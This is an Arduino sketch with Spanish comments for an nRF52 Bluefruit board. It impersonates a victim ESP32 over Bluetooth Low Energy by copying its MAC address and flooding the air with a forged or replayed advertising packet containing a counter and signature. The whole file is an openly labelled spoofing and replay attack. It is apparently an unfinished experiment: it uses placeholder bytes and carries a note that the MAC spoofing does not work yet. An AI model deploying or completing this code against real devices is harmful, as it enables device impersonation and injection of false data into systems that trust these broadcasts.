#include <Adafruit_TinyUSB.h>
#include <bluefruit.h>

// ==========================================
// DATOS DE LA VÍCTIMA (ESP32)
// ==========================================

// 1. La MAC del ESP32 que se quiere suplantar
uint8_t mac_victima[] = { 0xAA, 0xBB, 0xCC, 0x11, 0x22, 0x33 };

// 2. El paquete falso es (de momento) de 13 bytes
// Ejemplo: ID(2) + CTR(4) + Data(1) + Firma(6)
uint8_t paquete_falso[] = { 
  0xFF, 0xFF,             // ID Fabricante
  0x00, 0x00, 0x00, 0x4A, // CTR (Se supone contador 74)
  0xAB,                   // Dato cifrado (inventado o copiado)
  0x12, 0x34, 0x56, 0x78, 0x90, 0xAB // Firma (inventada, queda probar copiada)
};

void setup() {
  Serial.begin(115200);
  
  // Esperar un poco para que Linux monte el USB
  delay(2000);
  Serial.println("--- INICIANDO MODO SPOOFER (ATAQUE) ---");

  Bluefruit.begin();
  
  // =================================================
  // PASO CRÍTICO: CAMBIAR LA MAC (IDENTITY THEFT)
  // =================================================
  // CORREGIR: No funciona la suplantación de momento
  bool mac_ok = Bluefruit.setAddr((ble_gap_addr_t*) mac_victima);
  
  if (mac_ok) {
    Serial.print("MAC suplantada exitosamente.");
  } else {
    Serial.println("Error cambiando MAC. El ataque podría fallar.");
  }

  // Configuración de potencia (Máxima para asegurar que se llega antes que el original)
  //Bluefruit.setTxPower(8); 
  
  // Configurar el paquete de anuncio
  Bluefruit.Advertising.addFlags(BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE);
  
  // Se inyecta los bytes crudos EXACTOS del paquete falso
  Bluefruit.Advertising.addManufacturerData(paquete_falso, sizeof(paquete_falso));

  // Configuración de intervalo (Muy rápido para saturar)
  Bluefruit.Advertising.restartOnDisconnect(true);
  Bluefruit.Advertising.setInterval(100, 100); // 62.5ms
  
  Bluefruit.Advertising.start(0); // 0 = Nunca parar
  
  Serial.println("Inyectando paquetes en el aire...");
}

void loop() {
  // Simular que se cambia el paquete cada cierto tiempo (opcional)
  // Para probar "Replay Attack", el paquete debe ser estático.
  Serial.println("Enviando paquete falso...");
  delay(2000);
}